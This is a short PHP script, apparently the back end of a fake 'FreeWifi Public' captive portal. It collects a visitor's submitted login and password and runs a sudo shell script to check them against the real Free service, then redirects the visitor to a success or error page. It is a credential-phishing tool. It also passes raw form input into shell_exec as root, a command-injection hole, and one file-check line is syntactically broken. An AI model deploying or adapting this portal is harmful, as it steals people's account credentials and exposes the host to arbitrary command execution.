<?php
session_start ();
# recuperation session de useragent
if (isset($_SESSION['UserAgent'])) {
	$useragent = $_SESSION['UserAgent'];
}

if (isset($_SESSION['url'])) {
	$urlUser = $_SESSION['url'];
}

# Recuperation du champ login et password
$login = $_POST['login'];
$password = $_POST['password'];

# Recuperation du language et IP client
#$user_agent = $_SERVER["HTTP_USER_AGENT"];
$accept_language = $_SERVER["HTTP_ACCEPT_LANGUAGE"];
$remote_ip = $_SERVER["REMOTE_ADDR"];

$replaceLang = str_replace(";", ",", $accept_language);

# lance le script de test des identifiants free
#shell_exec("sudo /var/www/free_wifi.sh $login $password $useragent $replaceLang $remote_ip");
shell_exec("sudo /var/www/free_wifi.sh $login $password $remote_ip");

# bitFile ; 
$bitFile = "$remote_ip";

# Check si le fichier "1" a été crée par free_wifi.sh 
if (file_exists('/var/www/'$remote_ip'/1') == true) { 

header ('location: reussi.php');

}

else {



#$removeDir = shell_exec("sudo /var/www/removedir.sh $remote_ip");

#header ('location: '.$urlUser);
header ('location: error.html');
} 

?>

<!--
<html>
  <head>
    <title>FreeWifi Public</title>
    <meta></meta>
  </head>
<body>
<br /><br /><br /><br /><br />
<center><a>Vous êtes authentifié</a></center><br />
<center><a>Vous allez être redirigé dans quelques secondes vers le site GOOGLE.FR</a></center>

</body>
</html> -->
